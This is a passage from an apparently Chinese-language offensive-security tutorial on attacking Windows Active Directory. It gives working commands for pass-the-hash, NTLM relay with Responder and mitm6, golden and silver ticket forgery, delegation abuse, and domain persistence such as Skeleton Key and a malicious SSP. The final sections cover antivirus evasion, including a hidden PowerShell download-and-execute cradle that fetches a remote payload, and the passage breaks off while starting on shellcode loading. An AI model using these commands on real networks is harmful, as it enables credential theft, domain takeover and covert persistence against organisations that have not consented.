<pre class="line-numbers language-none"><code class="language-none"> python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c domain&#x2F;administrator@1.1.1.1 “whoami”

psexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:518B98AD4178A53695DC997AA02D455C domiain&#x2F;administrator@1.1.1.1 “whoami”

smbexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:CCEF208C6485269C20DB2CAD21734FE7 domiain&#x2F;administrator@1.1.1.1 “whoami” |<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="5-2-2-Invoke-TheHash套件"><a href="#5-2-2-Invoke-TheHash套件" class="headerlink" title="5.2.2 Invoke-TheHash套件"></a>5.2.2 Invoke-TheHash套件</h3><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Invoke-TheHash/">https://github.com/Kevin-Robertson/Invoke-TheHash/</a></p>
<pre class="line-numbers language-none"><code class="language-none">Invoke-WMIExec -Target 1.1.1.1 -Domain test.local -Username username -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command “calc.exe” -verbose

Invoke-SMBExec -Target 1.1.1.1 -Domain test.local -Username username -Hash 7ECFFFF0C3548187607A14BAD0F88BB1 -Command “calc.exe” -verbose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010930950.png"></p>
<h3 id="5-2-3-mimikatz"><a href="#5-2-3-mimikatz" class="headerlink" title="5.2.3 mimikatz"></a>5.2.3 mimikatz</h3><p>使用如下命令：</p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug sekurlsa::pth &#x2F;user:test1 &#x2F;domain:test.local &#x2F;ntlm:7ECFFFF0C3548187607A14BAD0F88BB1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>弹出cmd：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010931905.png"></p>
<p>安装KB2871997补丁后，可以使用AES-256密钥进行hash传递：</p>
<p>抓取AES-256密钥：</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz: privilege::debug sekurlsa::ekeys privilege::debug sekurlsa::pth &#x2F;user:test1 &#x2F;domain:test.local &#x2F;aes256:aes256key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="5-3-NTLM-Relay"><a href="#5-3-NTLM-Relay" class="headerlink" title="5.3 NTLM-Relay"></a>5.3 NTLM-Relay</h2><p>上述都是“主动性”的攻击行为，也就是主动去连接别人，那我们也可以尝试“被动性”攻击，当别人访问我们时，或者说是无感知访问时，我们能做什么操作？</p>
<p>实验环境：</p>
<p>win7 172.16.127.184 普通域用户</p>
<p>win10 172.16.127.170 域管</p>
<p>dcserver 172.16.127.173 域控</p>
<p>kali 172.16.127.129 攻击机</p>
<p>利用工具：</p>
<p>Responder、impacket</p>
<h3 id="5-3-1-LLMNR"><a href="#5-3-1-LLMNR" class="headerlink" title="5.3.1 LLMNR"></a>5.3.1 LLMNR</h3><p>先来一段百科介绍，链路本地多播名称解析（LLMNR）是一个基于协议的域名系统（DNS）数据包的格式，使得双方的IPv4和IPv6的主机来执行名称解析为同一本地链路上的主机。它是包含在Windows<br> Vista中，Windows Server 2008中，Windows 7中，Windows 8中和的Windows<br> 10。它也被实施systemd在Linux上-resolved。 LLMNR定义在RFC 4795。</p>
<p>在DNS 服务器不可用时，DNS 客户端计算机可以使用本地链路多播名称解析<br> (LLMNR—Link-Local Multicast Name Resolution)（也称为多播 DNS 或<br> mDNS）来解析本地网段上的名称。例如，如果路由器出现故障，从网络上的所有 DNS<br> 服务器切断了子网，则支持 LLMNR<br> 的子网上的客户端可以继续在对等基础上解析名称，直到网络连接还原为止。</p>
<p>除了在网络出现故障的情况下提供名称解析以外，LLMNR<br> 在建立临时对等网络（例如，机场候机区域）方面也非常有用。</p>
<p>翻译成白话文怎么说：你正常内网中如访问真实存在的机器，如jumbo01,当有一天你不小心输成了不存在的机器jumbo02，客户端就会问内网中谁是jumbo02啊，有没有是jumbo02的人啊。</p>
<p>攻击手法v1.0</p>
<p>首先我们如果访问一台不存在的机器jumbo02，是以下这个结果</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010931648.png"></p>
<p>那我们如果我们在客户端询问谁是jumbo02的时候应答他的话，就是这个结果</p>
<p>攻击机执行</p>
<pre class="line-numbers language-none"><code class="language-none">responder -I eth0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>客户端访问jumbo02提示需要输入密码</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010931519.png"></p>
<p>输入密码后，攻击机收到net-ntlm：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010931730.png"></p>
<p>收到net-ntlm以后我们就可以尝试利用hashcat进行破解等攻击。</p>
<h3 id="5-3-2-WPAD"><a href="#5-3-2-WPAD" class="headerlink" title="5.3.2 WPAD"></a>5.3.2 WPAD</h3><p>先来一段百科介绍，网络代理自动发现协议（Web Proxy Auto-Discovery<br> Protocol，WPAD）是一种客户端使用DHCP和/或DNS发现方法来定位一个配置文件URL的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定URL应使用的代理。</p>
<p>翻译成白话文怎么说：就是你的上网配置、怎么上网，如果你浏览器设置了上网自动检测设置（默认配置），客户端上网的时候，就会问，谁是wpad服务器啊，你是wpad服务器啊，然后拿着pac文件上网去了。</p>
<p>攻击手法v1.0</p>
<p>首先我们本身想访问存在的网站 <a target="_blank" rel="noopener" href="http://www.chinabaiker.com/">www.chinabaiker.com</a> ,可是不小心打错了一个字母或者多打少打了一个字母，默认会直接跳到搜到引擎上去，或者提示无法访问，比如 <a target="_blank" rel="noopener" href="http://www.chinabaikee.com/">www.chinabaikee.com</a></p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010932632.png"></p>
<p>那如果我们伪造wpad服务器的话，首先攻击机执行</p>
<pre class="line-numbers language-none"><code class="language-none">responder -I eth0 -wFb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010932903.png"></p>
<p>这里使用-b参数强制使用401认证</p>
<p>客户端访问一个不存在的域名时会跳出登录框</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010932410.png"></p>
<p>输入账号密码以后，我们收到明文账号密码</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010932357.png"></p>
<p>从responder的信息反馈能得知，实际上是利用wpad欺骗返回了一个401认证，导致欺骗我们获取了其账号密码。</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010933894.png"></p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010933199.png"></p>
<p>攻击手法v1.1</p>
<p>既然我们能够让客户端下载我们的pac，就能在pac里面让客户端的流量走我们这边，这里我利用msf配置burp演示代理抓取客户端流量。</p>
<p>攻击机执行</p>
<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;spoof&#x2F;nbns&#x2F;nbns_response
set regex WPAD
set spoofip attackip
run
use auxiliary&#x2F;server&#x2F;wpad
set proxy 172.16.127.155
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>打开burp，以下只在非域内但是同一个网络中的机器的firefox成功</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010934429.png"></p>
<p>为什么会出现上面的问题呢，实际上是因为<a target="_blank" rel="noopener" href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">MS16-077补丁问题</a>。</p>
<pre class="line-numbers language-none"><code class="language-none">In 2016 however, Microsoft published a security bulletin MS16-077, which mitigated this attack by adding two important protections: – The location of the WPAD file is no longer requested via broadcast protocols, but only via DNS. – Authentication does not occur automatically anymore even if this is requested by the server.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>利用mitm6让客户端设置我们为ipv6 dns服务器</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010934031.png"></p>
<p>wpad成功在chrome上欺骗</p>
<p>PS：以上成功还是在非域内机器。</p>
<p>攻击手法v2.0</p>
<p>上面说了多，最重要的不过还是权限。大家应该知道smb<br> relay，但是这个漏洞很早就在MS08-068补丁中被修复了。但是这个不妨碍我们在未校验smb签名等情况下进行NTLM-Relay转发。我们执行responder，首先关闭掉smb，给接下来的ntlmrelayx使用。</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010935080.png">    </p>
<pre class="line-numbers language-none"><code class="language-none">responder -I eth0 ntlmrelayx.py -t 172.16.127.173 -l .&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>域管机器访问不存在的机器时，会中继到域控机器，我们成功获取shell</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010935102.png"></p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010935559.png"></p>
<h2 id="5-4-域信任"><a href="#5-4-域信任" class="headerlink" title="5.4 域信任"></a>5.4 域信任</h2><p>当存在子父域时，默认其是双向信任。可以利用sid history跨域提权。流程大致如下：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010936650.png"></p>
<p>图片来源：<a target="_blank" rel="noopener" href="http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/">http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/</a></p>
<p>利用如下，使用mimikatz获取子域的Krbtgt Hash：</p>
<pre class="line-numbers language-none"><code class="language-none">lsadump::lsa &#x2F;patch |<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010936219.png"></p>
<p>再使用powerview获取父域的sid：</p>
<pre class="line-numbers language-none"><code class="language-none">Get-DomainComputer -Domain jumbolab.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010936042.png"></p>
<p>然后添加一个sid=519的企业管理员，利用mimikatz执行如下命令：</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;user:Administrator &#x2F;krbtgt:5a1c26831592774a17f70370b8606449 &#x2F;domain:child.jumbolab.com &#x2F;sid:S-1-5-21-1786649982-4053697927-1628754434 &#x2F;sids:S-1-5-21-4288736272-2299089681-4131927610-519 &#x2F;ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最终成功获取父域权限：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010936367.png"></p>
<h2 id="5-5-攻击Kerberos"><a href="#5-5-攻击Kerberos" class="headerlink" title="5.5 攻击Kerberos"></a>5.5 攻击Kerberos</h2><p>在域中，最核心的就是kerberos协议了，但是也会出现各种安全问题，甚至可以以一个普通域用户提权到system权限，配置不当甚至可以获取到域控权限。</p>
<h3 id="5-5-1-PTT"><a href="#5-5-1-PTT" class="headerlink" title="5.5.1 PTT"></a>5.5.1 PTT</h3><p>当我们抓取到了krbtgt hash时，能做什么？继续往下看。</p>
<h4 id="5-5-1-1-金票据"><a href="#5-5-1-1-金票据" class="headerlink" title="5.5.1.1 金票据"></a>5.5.1.1 金票据</h4><p>上面提到了ms14-068，也介绍Kerberos协议，知道了TGT是由krbtgt加密而成。因此当拿到krbtgt账号hash时，就可以构造一个任意权限的tgt了：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010937207.png" alt="img"></p>
<p>图片来源：<a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1515">https://adsecurity.org/?p=1515</a></p>
<p>使用方法：</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz kerberos::purge kerberos::golden &#x2F;admin:administrator &#x2F;domain:域 &#x2F;sid:SID &#x2F;krbtgt: krbtgt hash值 &#x2F;ticket:administrator.kiribi kerberos::ptt administrator.kiribi kerberos::tgt dir \dc.domain.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="5-5-1-2-银票据"><a href="#5-5-1-2-银票据" class="headerlink" title="5.5.1.2 银票据"></a>5.5.1.2 银票据</h4><p>上面的金票据是伪造的TGT，银票据是伪造TGS，由服务账号密码加密而成。</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010937699.png" alt="img"></p>
<p>图片来源：<a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1515">https://adsecurity.org/?p=1515</a></p>
<p>利用方法：</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe “kerberos::golden &#x2F;domain:域 &#x2F;sid:SID &#x2F;target:域控全称 &#x2F;service:要访问的服务，如cifs &#x2F;rc4:NTLM，计算机账号hash &#x2F;user:user &#x2F;ptt” dir \server\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010937420.png" alt="img"></p>
<h4 id="5-5-1-3-kekeo"><a href="#5-5-1-3-kekeo" class="headerlink" title="5.5.1.3 kekeo"></a>5.5.1.3 kekeo</h4><p>利用kekeo进行ptt：</p>
<pre class="line-numbers language-none"><code class="language-none">kekeo “tgt::ask &#x2F;user:test1 &#x2F;domain:test.local &#x2F;ntlm:7ECFFFF0C3548187607A14BAD0F88BB1”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>执行后生成票据 <a href="mailto:TGT_test1@TEST.LOCAL_krbtgt">TGT_test1@TEST.LOCAL_krbtgt</a>~<a href="mailto:test.local@TEST.LOCAL.kirbi">test.local@TEST.LOCAL.kirbi</a></p>
<p>接下来导入票据：</p>
<pre class="line-numbers language-none"><code class="language-none">kekeo “kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi” dir \server\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="5-5-2-委派"><a href="#5-5-2-委派" class="headerlink" title="5.5.2 委派"></a>5.5.2 委派</h3><h4 id="5-5-2-1-基于资源的约束委派"><a href="#5-5-2-1-基于资源的约束委派" class="headerlink" title="5.5.2.1 基于资源的约束委派"></a>5.5.2.1 基于资源的约束委派</h4><p>流程图如下：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010937551.png" alt="img"></p>
<p>个人简单理解为A机器设置基于资源的约束委派给B(设置msDS-AllowedToActOnBehalfOfOtherIdentity属性)，则B可以通过s4u协议申请高权限票据对A进行利用。利用过程如下：</p>
<p>普通域用户默认可以添加10个机器账号，添加spnspnspn$并设置msds-allowedtoactonbehalfofotheridentity：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010938987.png" alt="img"></p>
<pre class="line-numbers language-none"><code class="language-none">get-adcomputer win7 -properties principalsallowedtodelegatetoaccount<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010938246.png" alt="img"></p>
<p>利用s4u协议申请高权限票据：</p>
<pre class="line-numbers language-none"><code class="language-none">getST.py -dc-ip 172.16.127.173 jumbolab.com&#x2F;spnspnspn$:spnspnspn -spn cifs&#x2F;win7.jumbolab.com -impersonate administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>导入票据：</p>
<pre class="line-numbers language-none"><code class="language-none">export KRB5CCNAME&#x3D;administrator.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问目标机器：</p>
<pre class="line-numbers language-none"><code class="language-none">smbexec.py -no-pass -k -debug win7.jumbolab.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010938183.png" alt="img"></p>
<h4 id="5-5-2-2-非约束委派"><a href="#5-5-2-2-非约束委派" class="headerlink" title="5.5.2.2 非约束委派"></a>5.5.2.2 非约束委派</h4><p>流程图如下：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010938313.png" alt="img">    </p>
<p>个人简单理解为user访问service1服务时，如果service1服务开启了非约束委派，则在user访问service1服务时，会把自身的tgt发送给service1，因此service1可以利用user的tgt去访问user可以访问的服务。利用过程如下：</p>
<p>win7机器开启了非约束委派：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010938407.png" alt="img"></p>
<p>下面我们再利用Spooler打印机服务错误强制让运行了spooler服务的机器通过kerberos或ntlm的方式连接指定的目标机器：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010939717.png" alt="img"></p>
<p>图片来源：<a target="_blank" rel="noopener" href="https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/">https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/</a></p>
<p>SpoolSample.exe dcserver win7</p>
<p>导出tgt：</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz privilege::debug sekurlsa::tickets &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010939280.png"></p>
<p>导入票据：</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::ptt [0;1f9fc7]-2-0-60a10000-DCSERVER$@krbtgt-JUMBOLAB.COM.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010950799.png" alt="img"></p>
<p>win7机器即可获取所有用户hash：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010950626.png" alt="img"></p>
<p>发现非约束委派机器可以用如下命令：</p>
<p>查找域中配置非约束委派用户:</p>
<pre class="line-numbers language-none"><code class="language-none">Get-NetUser -Unconstrained -Domain jumbolab.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查找域中配置非约束委派的主机：</p>
<pre class="line-numbers language-none"><code class="language-none">Get-NetComputer -Unconstrained -Domain jumbolab.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="5-5-2-3-约束委派"><a href="#5-5-2-3-约束委派" class="headerlink" title="5.5.2.3 约束委派"></a>5.5.2.3 约束委派</h4><p>流程图如下：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010956502.png" alt="img">    </p>
<p>利用过程如下：</p>
<p>存在服务用户，test，并设置约束委派：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010956409.png" alt="img"></p>
<p>服务账号可以为一个域用户设置spn即可:</p>
<pre class="line-numbers language-none"><code class="language-none">setspn.exe -U -A test&#x2F;test test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>申请tgt：</p>
<pre class="line-numbers language-none"><code class="language-none">kekeo： tgt::ask &#x2F;user:test &#x2F;domain:jumbolab.com &#x2F;password:aA123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010956662.png" alt="img"></p>
<p>利用生成的tgt申请st：</p>
<pre class="line-numbers language-none"><code class="language-none">kekeo： tgs::s4u &#x2F;tgt:TGT_test@JUMBOLAB.COM_krbtgt~jumbolab.com@JUMBOLAB.COM.kirbi &#x2F;user:Administrator@jumbolab.com &#x2F;service:cifs&#x2F;dcserver.jumbolab.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010958442.png" alt="img"></p>
<p>导入st：</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz： kerberos::ptt TGS_Administrator@jumbolab.com@JUMBOLAB.COM_cifs~dcserver.jumbolab.com@JUMBOLAB.COM.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010958289.png" alt="img"></p>
<p>发现约束委派机器可以用如下命令：</p>
<p>查找域中配置约束委派用户:</p>
<pre class="line-numbers language-none"><code class="language-none">Get-DomainUser -TrustedToAuth -Domain jumbolab.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>查找域中配置约束委派的主机：</p>
<pre class="line-numbers language-none"><code class="language-none">Get-DomainComputer -TrustedToAuth -Domain jumbolab.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="域维权"><a href="#域维权" class="headerlink" title="域维权"></a>域维权</h1><p>当拿下域控后，可以在域控上面做一些手脚，以保证后续的权限维持，甚至可以保证，就算域控密码改了，我们依然可以连接。</p>
<h2 id="6-1-DSRM"><a href="#6-1-DSRM" class="headerlink" title="6.1 DSRM"></a>6.1 DSRM</h2><p>该方法相当于重置了域控机器上的本地管理员密码。</p>
<p>DSRM，目录服务还原模式，是Windows服务器域控制器的安全模式启动选项。DSRM允许管理员用来修复或还原修复或重建活动目录数据库。DSRM账户实际上就是“Administrator”，也就是域控上面的本地管理员账号，非域管理员账号。当建立域控时，会让我们设置DSRM密码：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010959504.png" alt="img">    </p>
<p>我们用如下命令在域控上同步DSRM密码：</p>
<pre class="line-numbers language-none"><code class="language-none">ntdsutilset DSRM passwordSYNC FROM DOMAIN ACCOUNT usernameQQ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010959945.png" alt="img">    </p>
<p>即把DSRM重置成了和win7user用户一样的密码：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010959453.png" alt="img"></p>
<p>再在域控上添加注册表：</p>
<pre class="line-numbers language-none"><code class="language-none">reg add “ HKLM\System\CurrentControlSet\Control\Lsa” &#x2F;v DSRMAdminLogonBehavior &#x2F;t REG_DWORD &#x2F;d 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最后用pth连接过去：</p>
<pre class="line-numbers language-none"><code class="language-none">sekurlsa::pth &#x2F;domain:computername &#x2F;user:Administrator &#x2F;ntlm: b367819c0a8ccd792cad1d034f56a1fa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010959857.png" alt="img"></p>
<h2 id="6-2-GPO"><a href="#6-2-GPO" class="headerlink" title="6.2 GPO"></a>6.2 GPO</h2><p>当我们获取到管理员权限时，可以通过添加组策略手段，实现用户开机自启动。</p>
<p>域控上执行过程如下：</p>
<p>打开gpmc.msc ，编辑默认组策略：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011000683.png" alt="img"></p>
<p>然后添加启动项：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011001779.png" alt="img">    </p>
<p>并在对应的组策略目录下添加你的文件：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011001925.png" alt="img"></p>
<p>再执行如下命令强制刷新组策略：</p>
<pre class="line-numbers language-none"><code class="language-none">gpupdate &#x2F;force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最终域内其他机器重启后就会执行对应的文件/脚本：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011001211.png" alt="img">    </p>
<h2 id="6-3-SSP"><a href="#6-3-SSP" class="headerlink" title="6.3 SSP"></a>6.3 SSP</h2><p>Security Support Provider理解为一个dll，用来实现身份认证；Security Support<br> Provider Interface理解为SSP的API，用于执行各种与安全相关的操作，如身份验证。</p>
<p>在系统启动的时候，SSP会被加载到lsass.exe中,也就是说我们可以自定义一个dll在系统启动时加载到lsass.exe中。</p>
<p>利用mimikatz：</p>
<p>1、将mimilib.dll复制到域控c:\windows\system32</p>
<p>2、添加注册表:<br> HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\</p>
<p>添加mimilib.dll</p>
<p>3、重启后记录登录的密码：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011003072.png" alt="img"></p>
<p>也可以不重启,利用RPC加载SSP。</p>
<h2 id="6-4-Skeleton-Key"><a href="#6-4-Skeleton-Key" class="headerlink" title="6.4 Skeleton Key"></a>6.4 Skeleton Key</h2><p>利用mimikatz安装一个万能密码，“mimikatz”，实现代码可以参考如下：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_misc.c">https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_misc.c</a></p>
<pre class="line-numbers language-none"><code class="language-none">privilege::debug misc::skeleton<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>当执行完上述命令后，就可以使用“mimikatz”作为一个万能密码，去连接域控，该方法可用于当域控密码被改掉时，我们依然可以去控制域控。</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011003238.png" alt="img"></p>
<h2 id="6-5-Hook-PasswordChangeNotify"><a href="#6-5-Hook-PasswordChangeNotify" class="headerlink" title="6.5 Hook PasswordChangeNotify"></a>6.5 Hook PasswordChangeNotify</h2><p>通过往lsass.exe进程中注入dll，达到通过Hook<br> PasswordChangeNotify拦截修改的帐户密码。该方法可用于拦截域内修改的密码。</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/Jumbo-WJB/Misc-Windows-Hacking">https://github.com/Jumbo-WJB/Misc-Windows-Hacking</a></p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011004674.png" alt="img"></p>
<h1 id="免杀处理"><a href="#免杀处理" class="headerlink" title="免杀处理"></a>免杀处理</h1><p>在上述的攻击利用中，出现了各种各样的工具，但是现在的edr都对上述工具、上述手法都做了安全防护，因此如何绕过av，又是一段漫长的路。</p>
<h2 id="7-1-Powershell绕过"><a href="#7-1-Powershell绕过" class="headerlink" title="7.1 Powershell绕过"></a>7.1 Powershell绕过</h2><p>以常见的cs上线生成的powershell为例。当使用默认ps命令时，会被直接拦截：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011004652.png" alt="img"></p>
<p>我们先简单理解为拦截了这个命令，那就先简单尝试下加点特殊符号，而这个符号又不影响程序运行，比如“^”，但发现并不行：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011004374.png" alt="img"></p>
<p>那我们尝试把这个命令copy出来并换个名字试试呢？依然不行：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011004094.png" alt="img"></p>
<p>但是改成txt就成功了：</p>
<pre class="line-numbers language-none"><code class="language-none">jp.txt -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘http:&#x2F;&#x2F;1.2.3.4:80&#x2F;a‘))”<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="7-2-抓密码工具免杀"><a href="#7-2-抓密码工具免杀" class="headerlink" title="7.2 抓密码工具免杀"></a>7.2 抓密码工具免杀</h2><p>渗透日常中密码抓取必不可少，当看到域控在线，工具被杀，想抓密码怎么办？</p>
<p>第一种，配合上面的powershell绕过执行ps1版的mimikatz：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011005160.png" alt="img"></p>
<p>第二种，利用RPC加载SSP：</p>
<p><a target="_blank" rel="noopener" href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">https://blog.xpnsec.com/exploring-mimikatz-part-2/</a></p>
<p>让lsass.exe自己dump 内存：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011005217.png" alt="img"></p>
<p>微软签名的procdump也可以：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011005662.png" alt="img"></p>
<p>第三种，对工具本身做免杀，找个看起来无害化的工具：</p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/sekurlsa-wdigest.cpp">https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/sekurlsa-wdigest.cpp</a></p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011005659.png" alt="img"></p>
<p>如果手上没有IDE编译环境或者没有源码怎么办？找个被杀的工具：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011005081.png" alt="img">    </p>
<p>用restorator工具加个版本信息，成功免杀：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011005903.png" alt="img"></p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211011006488.png" alt="img"></p>
<h2 id="7-3-源码免杀"><a href="#7-3-源码免杀" class="headerlink" title="7.3 源码免杀"></a>7.3 源码免杀</h2><p>找个内存加载的源码，把shellcode加载执行。简单过程如下：</p>
<p>申请内存-&gt;写入shellcode-&gt;创建线程执行</p>
<p>先利用cs生成shellcode：</p>
